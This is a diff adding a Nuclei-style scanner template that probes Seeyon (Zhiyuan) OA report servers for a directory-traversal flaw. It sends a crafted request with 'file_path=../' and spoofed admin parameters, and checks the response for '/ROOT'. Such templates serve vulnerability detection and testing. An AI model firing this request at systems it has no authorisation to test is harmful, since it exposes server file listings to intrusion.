@@ -1,0 +1,30 @@
+id: ZhiyuanOA-directorytraversal
+
+info:
+  name: 致远OA目录遍历漏洞
+  author: htq
+  severity: low
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      GET /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true HTTP/1.1
+      Host: {{Hostname}}
+      Cache-Control: max-age=0
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
+      Upgrade-Insecure-Requests: 1
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+      Cookie: avatarImageUrl=-8462379801629736412
+
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+        - "/ROOT"
+    - type: status
+      status: 
+        - 200
